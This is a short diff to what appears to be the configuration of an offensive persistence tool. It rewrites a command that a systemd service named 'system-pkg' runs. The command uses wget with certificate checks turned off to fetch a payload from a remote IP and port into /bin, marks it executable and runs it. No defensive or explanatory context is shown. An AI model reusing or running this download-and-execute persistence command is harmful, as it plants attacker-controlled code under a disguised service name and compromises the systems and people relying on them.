@@ -118,7 +118,8 @@ WEB_PORT="8080"
 # Services
 SERVICE_PAYLOAD_PATH="/bin/$WEB_URI"
 SERVICE_NAME="system-pkg"
-SERVICE_COMMAND="test -f $SERVICE_PAYLOAD_PATH || wget -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI; chmod +x $SERVICE_PAYLOAD_PATH; $SERVICE_PAYLOAD_PATH; exit 0"
+#SERVICE_COMMAND="/usr/bin/test -f $SERVICE_PAYLOAD_PATH || $(which wget) -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI; $(which chmod) +x $SERVICE_PAYLOAD_PATH; $SERVICE_PAYLOAD_PATH; exit 0"
+SERVICE_COMMAND="$(which wget) -qO $SERVICE_PAYLOAD_PATH --no-check-certificate http://$IP:$WEB_PORT/$WEB_URI && $(which chmod) +x $SERVICE_PAYLOAD_PATH && $SERVICE_PAYLOAD_PATH && exit 0"
 
 # systemd
 SYSTEMD_SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
